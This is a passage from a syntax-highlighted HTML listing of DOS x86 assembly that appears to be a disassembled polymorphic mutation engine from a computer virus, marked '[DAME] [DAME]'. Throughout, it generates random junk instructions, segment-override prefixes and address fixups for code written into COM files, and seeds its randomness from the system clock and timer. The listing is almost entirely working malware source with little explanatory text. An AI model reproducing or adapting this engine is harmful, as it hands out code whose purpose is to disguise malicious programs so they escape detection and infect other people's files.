        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">try_seg_overrid</span><span class="sc0"> </span><span class="sc1">; generate segment override</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_4</span><span class="sc0">   </span><span class="sc1">; returns 0 - 3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">    </span><span class="sc1">; rotations</span><span class="sc0">

</span><span class="sc5">write_generated</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc1">; returns 0 - FF</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Ch</span><span class="sc0">     </span><span class="sc1">; MOV mem,Sreg ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_sreg</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000b</span><span class="sc0">  </span><span class="sc1">; only ES,CS,SS,DS</span><span class="sc0">

</span><span class="sc5">not_sreg</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111000b</span><span class="sc0"> </span><span class="sc1">; clear mod and r/m field</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">110b</span><span class="sc0">    </span><span class="sc1">; displacement 16 bit!</span><span class="sc0">

</span><span class="sc5">adress_2_write</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">  </span><span class="sc1">; if we write 2 memory, this 'll select correct adress</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; MOV AX, word</span><span class="sc0">
</span><span class="sc5">adress_used</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">cant_generate_0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; DX = random from ax</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc0"> </span><span class="sc1">; ¾     ; MOV SI, W</span><span class="sc0">
</span><span class="sc5">mvd_bdy_200_2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">

</span><span class="sc5">try_it_again</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; CX - value from W (END+200h)</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX - value from W (END+202h)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">cx_greater_dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">are_the_same</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">are_the_same</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">try_it_again</span><span class="sc0">

</span><span class="sc5">cx_greater_dx</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">cant_generate_0</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BFh</span><span class="sc0"> </span><span class="sc1">; ¿     ; MOV DI, word</span><span class="sc0">
</span><span class="sc5">table_pointer</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
                    </span><span class="sc1">; pointer in table 4 program correction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; store offset in file</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; store word in table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">table_pointer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc1">; update table pointer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">      </span><span class="sc1">; add 100h for correct offset in</span><span class="sc0">
                    </span><span class="sc1">; COM file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write_word</span><span class="sc0">  </span><span class="sc1">; and write down the address</span><span class="sc0">


</span><span class="sc5">try_seg_overrid</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">mvd_bdy_200_2</span><span class="sc1">; generate segment override</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">table_pointer</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">; check space left</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">bytes_left6plus</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; pop caller and return to caller's</span><span class="sc0">
                    </span><span class="sc1">; caller</span><span class="sc0">

</span><span class="sc5">locret_0_A23</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">            </span><span class="sc1">; not enough space , exit !</span><span class="sc0">

</span><span class="sc5">bytes_left6plus</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0"> </span><span class="sc1">; °     ; ...</span><span class="sc0">
                    </span><span class="sc1">; mov al, byte</span><span class="sc0">
</span><span class="sc5">override_switch</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">switch_clear</span><span class="sc0">    </span><span class="sc1">; s velkym otaznikom</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">     </span><span class="sc1">; prefix CS:</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CS_selected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc0">     </span><span class="sc1">; prefix SS:</span><span class="sc0">

</span><span class="sc5">CS_selected</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write_byte</span><span class="sc0">

</span><span class="sc5">switch_clear</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; s velkym otaznikom</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E7h</span><span class="sc0">    </span><span class="sc1">; generate nop in 1 of 256 cases</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">     </span><span class="sc1">; magic value ( also opcode ES: )</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">locret_0_A23</span><span class="sc0">    </span><span class="sc1">; or exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">; put NOP</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CS_selected</span><span class="sc0">

</span><span class="sc5">gr_lg_artm_mov</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10b</span><span class="sc0">          </span><span class="sc1">; ...</span><span class="sc0">
                    </span><span class="sc1">; ADD r8,r/m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1010b</span><span class="sc0">        </span><span class="sc1">; OR r8,r/m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10010b</span><span class="sc0">       </span><span class="sc1">; ADC r8,r/m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11010b</span><span class="sc0">       </span><span class="sc1">; SBB r8,r/m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100010b</span><span class="sc0">      </span><span class="sc1">; AND r8,r/m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">101010b</span><span class="sc0">      </span><span class="sc1">; SUB r8,r/m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">110010b</span><span class="sc0">      </span><span class="sc1">; XOR r8,r/m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">111000b</span><span class="sc0">      </span><span class="sc1">; CMP r/m,r8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">111010b</span><span class="sc0">      </span><span class="sc1">; CMP r8,r/m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10000100b</span><span class="sc0">        </span><span class="sc1">; TEST r/m,r8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10001010b</span><span class="sc0">        </span><span class="sc1">; MOV r8,r/m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10001110b</span><span class="sc0">        </span><span class="sc1">; MOV seg,r/m ------</span><span class="sc0">
</span><span class="sc5">grp_al_im8_r8</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10100000b</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">
                    </span><span class="sc1">; MOV AL,mem8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100b</span><span class="sc0">         </span><span class="sc1">; ADD AL,im8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1100b</span><span class="sc0">        </span><span class="sc1">; OR AL,im8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10100b</span><span class="sc0">       </span><span class="sc1">; ADC AL,im8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11100b</span><span class="sc0">       </span><span class="sc1">; SBB AL,im8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100100b</span><span class="sc0">      </span><span class="sc1">; AND AL,im8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">101100b</span><span class="sc0">      </span><span class="sc1">; SUB AL,im8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">110100b</span><span class="sc0">      </span><span class="sc1">; XOR AL,im8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">111100b</span><span class="sc0">      </span><span class="sc1">; CMP AL,im8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10101000b</span><span class="sc0">        </span><span class="sc1">; TEST AL,im8</span><span class="sc0">
</span><span class="sc5">LEA_LDS_LES</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11000101b</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">
                    </span><span class="sc1">; LDS r16,mem</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11000100b</span><span class="sc0">        </span><span class="sc1">; LES r16,mem</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10001101b</span><span class="sc0">        </span><span class="sc1">; LEA r16,mem</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1011000b</span><span class="sc0">     </span><span class="sc1">; POP 16bit reg</span><span class="sc0">
</span><span class="sc5">group_oper_r16</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1010000b</span><span class="sc0">     </span><span class="sc1">; ...</span><span class="sc0">
                    </span><span class="sc1">; 1 byte long operations with 16</span><span class="sc0">
                    </span><span class="sc1">; bit registers</span><span class="sc0">
                    </span><span class="sc1">; PUSH 16bit reg</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1001000b</span><span class="sc0">     </span><span class="sc1">; DEC 16 bit reg</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1000000b</span><span class="sc0">     </span><span class="sc1">; INC 16 bit reg</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10010000b</span><span class="sc0">        </span><span class="sc1">; XCHG AX,16 bit reg</span><span class="sc0">
                    </span><span class="sc1">; NOTE: XCHG AX,AX is called NOP !</span><span class="sc0">

</span><span class="sc5">trash_byte_tbl</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; table of 1 byte trash</span><span class="sc0">
                    </span><span class="sc1">; instruction</span><span class="sc0">
        </span><span class="sc6">daa</span><span class="sc0">
        </span><span class="sc6">das</span><span class="sc0">
        </span><span class="sc6">aaa</span><span class="sc0">
        </span><span class="sc6">aas</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">sahf</span><span class="sc0">
        </span><span class="sc6">lahf</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">xlat</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">cmpsw</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">scasw</span><span class="sc0">           </span><span class="sc1">; end of table</span><span class="sc0">


</span><span class="sc5">setup_random_se</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">       </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; setup random seed</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DH = seconds, DH=1/100 of seconds</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; Timer 8253-5 (AT: 8254.2).</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; Timer 8253-5 (AT: 8254.2).</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">put_to_rnd_seed</span><span class="sc0">

</span><span class="sc5">produce_random</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; returns AX</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; mov AX, randseed1</span><span class="sc0">
</span><span class="sc5">random_1</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">66D0h</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc0"> </span><span class="sc1">; º     ; mov DX,randseed2</span><span class="sc0">
</span><span class="sc5">random_2</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">66D0h</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">rnd_loop</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">sign_bit_clear</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">sign_bit_clear</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rnd_loop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">put_to_rnd_seed</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random_2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">setup_random_se</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">m_DameDame</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[DAME] [DAME]'</span><span class="sc0">
</span><span class="sc5">seg000</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">


        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
